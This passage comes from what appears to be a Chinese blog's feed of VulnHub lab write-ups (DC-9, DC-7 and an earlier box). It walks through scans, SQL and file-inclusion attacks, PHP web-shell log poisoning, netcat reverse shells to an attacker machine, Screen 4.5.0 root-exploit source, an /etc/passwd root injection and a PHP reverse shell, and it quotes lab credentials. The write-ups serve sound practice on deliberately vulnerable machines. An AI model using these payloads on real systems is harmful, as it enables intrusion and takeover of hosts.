09:35\nCompleted NSE at 09:35, 0.00s elapsed\nInitiating ARP Ping Scan at 09:35\nScanning 172.16.89.6 [1 port]\nCompleted ARP Ping Scan at 09:35, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 09:35\nCompleted Parallel DNS resolution of 1 host. at 09:35, 0.00s elapsed\nInitiating SYN Stealth Scan at 09:35\nScanning 172.16.89.6 [65535 ports]\nDiscovered open port 111/tcp on 172.16.89.6\nDiscovered open port 80/tcp on 172.16.89.6\nDiscovered open port 36004/tcp on 172.16.89.6\nCompleted SYN Stealth Scan at 09:35, 5.64s elapsed (65535 total ports)\nInitiating Service scan at 09:35                                                                                                                                                 \nScanning 3 services on 172.16.89.6                                                                                                                                               \nCompleted Service scan at 09:35, 11.03s elapsed (3 services on 1 host)\nInitiating OS detection (try #1) against 172.16.89.6\nNSE: Script scanning 172.16.89.6.\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.10s elapsed\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.02s elapsed\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.00s elapsed\nNmap scan report for 172.16.89.6\nHost is up (0.0014s latency).\nNot shown: 65532 closed ports\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    nginx 1.6.2\n| http-methods: \n|_  Supported Methods: GET HEAD POST\n|_http-server-header: nginx/1.6.2\n|_http-title: Welcome\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          36004/tcp   status\n|   100024  1          41353/udp6  status\n|   100024  1          43829/tcp6  status\n|_  100024  1          57305/udp   status\n36004/tcp open  status  1 (RPC #100024)\nMAC Address: 00:0C:29:DC:BD:E9 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 0.080 days (since Tue Oct  5 07:41:18 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.41 ms 172.16.89.6\n\nNSE: Script Post-scanning.\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.00s elapsed\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.00s elapsed\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.78 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br></div></div><p>发现80端口，浏览器访问页面，没有特殊组件，使用php</p>\n<p><img src=\"/assets/img/image-20211005093816521.png\" alt=\"image-20211005093816521\" /></p>\n<h2 id=\"_0x03-渗透\"> 0x03 渗透</h2>\n<p>访问页面，发现Contact下有一个提交表单，尝试没有sql注入，不管输入什么参数返回页面都是一样的，使用burp尝试get参数和值的猜测</p>\n<p>参数字典选择常见的 GET 参数字典 :</p>\n<div><pre><code>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api%26params/GET_params_Top99.txt\n</code></pre>\n<div><span>1</span><br></div></div><p>参数值选择 Linux 的 LFI Payload 字典 :</p>\n<div><pre><code>https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/LFI/LFI_Linux.txt\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211005093816521-3412197.png\" alt=\"image-20211005093816521\" /></p>\n<p><img src=\"/assets/img/6.png\" alt=\"6\" /></p>\n<p>很明显存在文件包含漏洞，观察发现可以包含nginx日志文件</p>\n<p><img src=\"/assets/img/7.png\" alt=\"7\" /></p>\n<p>访问显示了日志内容</p>\n<p><img src=\"/assets/img/image-20211005094438514-3412234.png\" alt=\"image-20211005094438514\" /></p>\n<p>可以进行日志中毒攻击，使用burp抓包，在 User-Agent: 中添加 payload: <code>&lt;?php system($_GET['cmd']) ?&gt;</code>，使用御剑连接失败，换<?php @eval($_POST['hacker']); ?>还是连接失败，怀疑有过滤，继续尝试</p>\n<div><pre><code>&lt;?php\n     $a = &quot;assert&quot;;\n     $a($_POST[&#39;hacker&#39;]);\n?&gt;\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><p>御剑连接成功</p>\n<p>下面拿shell，kali运行</p>\n<div><pre><code>nc -nlvp 4444\n</code></pre>\n<div><span>1</span><br></div></div><p>使用御剑执行命令</p>\n<div><pre><code>nc 172.16.89.2 4444 -e /bin/bash\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211005095333369.png\" alt=\"image-20211005095333369\" /></p>\n<p>继续执行</p>\n<div><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;\nexport TERM=xterm\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>升级shell</p>\n<h2 id=\"_0x04-提权\"> 0x04 提权</h2>\n<p>找带 suid 的文件</p>\n<div><pre><code>find / -perm -u=s 2&gt;/dev/null\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/11.png\" alt=\"11\" /></p>\n<p>在 searchsploit 里找到了一个可以提权的，版本正好是 Screen 4.5.0</p>\n<div><pre><code>searchsploit -w screen 4.5.0\n</code></pre>\n<div><span>1</span><br></div></div><p>访问 https://www.exploit-db.com/exploits/41154 下载 POC</p>\n<p>kali 上发送</p>\n<div><pre><code>nc -nlvp 6666 &lt; 41154.sh\n</code></pre>\n<div><span>1</span><br></div></div><p>靶机上接收，并运行</p>\n<div><pre><code>cd /tmp\nnc 192.168.141.134 6666 &gt; 41154.sh\nsh 41154.sh\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>等了半天，没有提成功，网上搜了下，其他人的做法是将 poc 拆分开来运行，照着试试看</p>\n<p>在 kali 下运行</p>\n<div><pre><code>tee libhax.c &lt;&lt;-&#39;EOF&#39;\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n__attribute__ ((__constructor__))\nvoid dropshell(void){\n    chown(&quot;/tmp/rootshell&quot;, 0, 0);\n    chmod(&quot;/tmp/rootshell&quot;, 04755);\n    unlink(&quot;/etc/ld.so.preload&quot;);\n    printf(&quot;[+] done!\\n&quot;);\n}\nEOF\n\ntee rootshell.c &lt;&lt;-&#39;EOF&#39;\n#include &lt;stdio.h&gt;\nint main(void){\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp(&quot;/bin/sh&quot;, NULL, NULL);\n}\nEOF\n\ngcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c\ngcc -o ./rootshell ./rootshell.c\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><p>把编译好的 libhax.so 和 rootshell 从 kali 传给 靶机</p>\n<div><pre><code>python -m SimpleHTTPServer 8080\ncd /tmp\nwget 192.168.141.134:8080/libhax.so;wget 192.168.141.134:8080/rootshell\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>运行 poc</p>\n<div><pre><code>cd /etc\numask 000\nscreen -D -m -L ld.so.preload echo -ne  &quot;\\x0a/tmp/libhax.so&quot;\nscreen -ls\n/tmp/rootshell\nwhoami\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><p><img src=\"/assets/img/12.png\" alt=\"12\" /></p>\n<p><img src=\"/assets/img/13.png\" alt=\"13\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20211005093413765.png",
      "date_published": "2021-10-05T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC9-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc9/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc9/",
      "content_html": "<h2 id=\"_0x01-介绍\"> 0x01 介绍</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-9,412/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-9,412/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>nmap扫描ip</p>\n<div><pre><code>nmap -sP 172.16.89.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211007223845787.png\" alt=\"image-20211007223845787\" /></p>\n<p>发现ip：172.16.89.10，继续扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 172.16.89.10\n</code></pre>\n<div><span>1</span><br></div></div><p>扫描结果</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 22:39 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating ARP Ping Scan at 22:39\nScanning 172.16.89.10 [1 port]\nCompleted ARP Ping Scan at 22:39, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 22:39\nCompleted Parallel DNS resolution of 1 host. at 22:39, 0.00s elapsed\nInitiating SYN Stealth Scan at 22:39\nScanning 172.16.89.10 [65535 ports]\nDiscovered open port 80/tcp on 172.16.89.10\nCompleted SYN Stealth Scan at 22:39, 8.42s elapsed (65535 total ports)\nInitiating Service scan at 22:39\nScanning 1 service on 172.16.89.10\nCompleted Service scan at 22:39, 6.02s elapsed (1 service on 1 host)\nInitiating OS detection (try #1) against 172.16.89.10\nNSE: Script scanning 172.16.89.10.\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.27s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.03s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.01s elapsed\nNmap scan report for 172.16.89.10\nHost is up (0.0012s latency).\nNot shown: 65533 closed ports\nPORT   STATE    SERVICE VERSION\n22/tcp filtered ssh\n80/tcp open     http    Apache httpd 2.4.38 ((Debian))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Example.com - Staff Details - Welcome\nMAC Address: 00:0C:29:EE:8C:38 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 32.554 days (since Sun Sep  5 09:21:42 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=252 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.24 ms 172.16.89.10\n\nNSE: Script Post-scanning.\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.01s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.94 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br></div></div><h2 id=\"_0x03-渗透\"> 0x03 渗透</h2>\n<p>使用浏览器访问http://172.16.89.10，发现一个搜索和登陆功能，先试试搜索功能有没有sql注入，使用burp抓搜索包</p>\n<p><img src=\"/assets/img/image-20211007224804392.png\" alt=\"image-20211007224804392\" /></p>\n<p>将请求内容保存到request.txt中，使用sqlmap进行扫描</p>\n<div><pre><code>sqlmap -r request.txt --dbs\n</code></pre>\n<div><span>1</span><br></div></div><p>发现存在sql注入，进一步扫描</p>\n<div><pre><code>sqlmap -r request.txt -D Staff --tables\nsqlmap -r request.txt -D Staff -T Users --dump\nsqlmap -r request.txt -D Staff -T StaffDetails --dump\n\nsqlmap -r request.txt -D users --tables\nsqlmap -r request.txt -D Staff -T UserDetails --dump\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><p>UserDetails表下发现一些用户名密码</p>\n<p><img src=\"/assets/img/image-20211007231327154.png\" alt=\"image-20211007231327154\" /></p>\n<p>StaffDetails表下发现员工信息</p>\n<p><img src=\"/assets/img/image-20211007231017283.png\" alt=\"image-20211007231017283\" /></p>\n<p>Users表下发现admin账号和密码hash</p>\n<div><pre><code>admin：856f5de590ef37314e7c3bdf6f8a66dc\n</code></pre>\n<div><span>1</span><br></div></div><p>似乎是md5，进行md5解密，得到密码<em>transorbital1</em></p>\n<p><img src=\"/assets/img/image-20211007225413206.png\" alt=\"image-20211007225413206\" /></p>\n<p>使用发现的账号密码登陆</p>\n<p><img src=\"/assets/img/image-20211007225528688.png\" alt=\"image-20211007225528688\" /></p>\n<p>有一条错误信息&quot;File does not exist&quot;，猜测存在文件包含漏洞，对请求参数和值进行模糊测试</p>\n<p><img src=\"/assets/img/image-20211007230414693.png\" alt=\"image-20211007230414693\" /></p>\n<p>发现存在file参数文件包含漏洞</p>\n<p><img src=\"/assets/img/image-20211007230703806.png\" alt=\"image-20211007230703806\" /></p>\n<p>查攻略，发现使用了knock 服务保护 SSH,按特定的访问端口才可以访问服务，访问knock的配置文件</p>\n<p>http://172.16.89.10/manage.php?file=../../../../../../../../etc/knockd.conf</p>\n<p><img src=\"/assets/img/image-20211007232625489.png\" alt=\"image-20211007232625489\" /></p>\n<p>访问配置文件中的端口</p>\n<div><pre><code><span>for</span> <span>x</span> <span>in</span> <span>7469</span> <span>8475</span> <span>9842</span><span>;</span> <span>do</span> nmap -Pn --max-retries <span>0</span> -p <span>$x</span> <span>192.168</span>.141.143<span>;</span> <span>done</span>\n</code></pre>\n<div><span>1</span><br></div></div><p>下来ssh可以连接了，尝试之前UserDetail表中爆出的账号密码，发现三个可用</p>\n<div><pre><code>chandlerb   UrAG0D!\njoeyt       Passw0rd\njanitor     Ilovepeepee\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>在hanitor下发现隐藏文件</p>\n<p><img src=\"/assets/img/image-20211007233100015.png\" alt=\"image-20211007233100015\" /></p>\n<p>使用这个密码表再测一下ssh，发现一个新账号登陆成功</p>\n<div><pre><code>fredf   B4-Tru3-001\n</code></pre>\n<div><span>1</span><br></div></div><p>下来尝试提权</p>\n<h2 id=\"_0x04-提权\"> 0x04 提权</h2>\n<p>运行</p>\n<div><pre><code>sudo -l\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211007233251603.png\" alt=\"image-20211007233251603\" /></p>\n<p>运行/opt/devstuff/dist/test/test，发现其实是运行test.py</p>\n<p><img src=\"/assets/img/image-20211007233446942.png\" alt=\"image-20211007233446942\" /></p>\n<p>搜索test.py</p>\n<div><pre><code>find / -name test.py\n</code></pre>\n<div><span>1</span><br></div></div><p>发现test.py路径：/opt/devstuff/test.py，查看test.py代码</p>\n<div><pre><code>#!/usr/bin/python\n\nimport sys\n\nif len (sys.argv) != 3 :\n    print (&quot;Usage: python test.py read append&quot;)\n    sys.exit (1)\n\nelse :\n    f = open(sys.argv[1], &quot;r&quot;)\n    output = (f.read())\n\n    f = open(sys.argv[2], &quot;a&quot;)\n    f.write(output)\n    f.close()\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><p>作用是读取第一个参数文件的，添加到第二哥参数文件中，可以用来修改/etc/passwd</p>\n<div><pre><code>echo &#39;test:sXuCKi7k3Xh/s:0:0::/root:/bin/bash&#39; &gt; /tmp/test\ncd /opt/devstuff/dist/test/\nsudo ./test /tmp/test /etc/passwd\nsu test\nPassword: toor\n\ncd /root\nls\ncat theflag.txt\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><p><img src=\"/assets/img/image-20211007234114035.png\" alt=\"image-20211007234114035\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20211007223845787.png",
      "date_published": "2021-10-07T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC7-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc7/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc7/",
      "content_html": "<h2 id=\"_0x01-介绍\"> 0x01 介绍</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-7,356/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-7,356/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>While this isn't an overly technical challenge, it isn't exactly easy.</p>\n<p>While it's kind of a logical progression from an earlier DC release (I won't tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. 😃 If you need to resort to brute forcing or dictionary attacks, you probably won't succeed.</p>\n<p>What you will need to do, is to think &quot;outside&quot; of the box.</p>\n<p>Waaaaaay &quot;outside&quot; of the box. 😃</p>\n<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>nmap扫描ip</p>\n<div><pre><code>nmap -sP 172.16.89.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211005210036930.png\" alt=\"image-20211005210036930\" /></p>\n<p>发现靶机ip172.16.89.8，继续nmap扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 172.16.89.8\n</code></pre>\n<div><span>1</span><br></div></div><p>结果</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 21:00 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 21:00\nCompleted NSE at 21:00, 0.00s elapsed\nInitiating NSE at 21:00\nCompleted NSE at 21:00, 0.00s elapsed\nInitiating NSE at 21:00\nCompleted NSE at 21:00, 0.00s elapsed\nInitiating ARP Ping Scan at 21:00\nScanning 172.16.89.8 [1 port]\nCompleted ARP Ping Scan at 21:00, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 21:00\nCompleted Parallel DNS resolution of 1 host. at 21:00, 0.00s elapsed\nInitiating SYN Stealth Scan at 21:00\nScanning 172.16.89.8 [65535 ports]\nDiscovered open port 22/tcp on 172.16.89.8\nDiscovered open port 80/tcp on 172.16.89.8\nCompleted SYN Stealth Scan at 21:01, 4.85s elapsed (65535 total ports)\nInitiating Service scan at 21:01\nScanning 2 services on 172.16.89.8\nCompleted Service scan at 21:01, 6.02s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 172.16.89.8\nNSE: Script scanning 172.16.89.8.\nInitiating NSE at 21:01\nCompleted NSE at 21:01, 0.65s elapsed\nInitiating NSE at 21:01\nCompleted NSE at 21:01, 0.02s elapsed\nInitiating NSE at 21:01\nCompleted NSE at 21:01, 0.00s elapsed\nNmap scan report for 172.16.89.8\nHost is up (0.0011s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)\n|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)\n|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03\n|_http-generator: Drupal 8 (https://www.drupal.org)\n| http-methods: \n|_  Supported Methods: GET POST HEAD OPTIONS\n| http-robots.txt: 22 disallowed entries (15 shown)\n| /core/ /profiles/ /README.txt /web.config /admin/\n| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ \n| /user/password/ /user/login/ /user/logout/ /index.php/admin/ \n|_/index.php/comment/reply/\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Welcome to DC-7 | D7\nMAC Address: 00:0C:29:F0:A0:5E (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 0.003 days (since Tue Oct  5 20:57:21 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=255 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.09 ms 172.16.89.8\n\nNSE: Script Post-scanning.\nInitiating NSE at 21:01\nCompleted NSE at 21:01, 0.00s elapsed\nInitiating NSE at 21:01\nCompleted NSE at 21:01, 0.00s elapsed\nInitiating NSE at 21:01\nCompleted NSE at 21:01, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.28 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br></div></div><h2 id=\"_0x03-渗透\"> 0x03 渗透</h2>\n<p>扫描发现80端口运行的Drupal，尝试利用漏洞都没有成功，根据网上搜索，考虑到提示&quot;outside&quot; of the box，先根据网站最下姓名</p>\n<p><img src=\"/assets/img/image-20211005214333874.png\" alt=\"image-20211005214333874\" /></p>\n<p>搜索到twitter</p>\n<p><img src=\"/assets/img/image-20211005214622642.png\" alt=\"image-20211005214622642\" /></p>\n<p>再到github</p>\n<p><img src=\"/assets/img/image-20211005214701089.png\" alt=\"image-20211005214701089\" /></p>\n<p>在config.php下发现账号密码</p>\n<p><img src=\"/assets/img/image-20211005214724674.png\" alt=\"image-20211005214724674\" /></p>\n<p>尝试web登陆失败</p>\n<p><img src=\"/assets/img/image-20211005214807409.png\" alt=\"image-20211005214807409\" /></p>\n<p>尝试ssh登陆成功</p>\n<p><img src=\"/assets/img/image-20211005214900882.png\" alt=\"image-20211005214900882\" /></p>\n<p>使用drush修改admin密码</p>\n<div><pre><code>cd /var/www/html\ndrush user-password admin --password=&quot;admin&quot;\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>web使用admin登陆</p>\n<p>登录后台,这里参考 https://www.sevenlayers.com/index.php/164-drupal-to-reverse-shell Drupal 后台提权的方法,进入 Manage--&gt;Extend--&gt;List--&gt;Install new module</p>\n<p><img src=\"/assets/img/11-20211005223343176.png\" alt=\"img\" /></p>\n<p>访问下载插件 https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz ,直接下载或手动上传都行,自选</p>\n<p>上传成功后,点击 Enable newly added modules</p>\n<p><img src=\"/assets/img/12-20211005223401242.png\" alt=\"img\" /></p>\n<p>到 FILTERS 选项，勾选 PHP Filter，点击下方的 Install</p>\n<p><img src=\"/assets/img/13-20211005223411892.png\" alt=\"img\" /></p>\n<p>回到主页，在左边的 Tools 栏中点击 Add content -&gt; Basic page,Text format 选择 PHP code</p>\n<p><img src=\"/assets/img/14.png\" alt=\"img\" /></p>\n<p>写入一个 php 反向 shell 即可</p>\n<p>找到一个可以直接利用的 php 源码 http://pentestmonkey.net/tools/web-shells/php-reverse-shell</p>\n<div><pre><code>&lt;?php\n\nset_time_limit (0);\n$VERSION = &quot;1.0&quot;;\n$ip = &#39;172.16.89.2&#39;;\n$port = 4444;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;\n$daemon = 0;\n$debug = 0;\n\nif (function_exists(&#39;pcntl_fork&#39;)) {\n\t// Fork and have the parent process exit\n\t$pid = pcntl_fork();\n\n\tif ($pid == -1) {\n\t\tprintit(&quot;ERROR: Can&#39;t fork&quot;);\n\t\texit(1);\n\t}\n\n\tif ($pid) 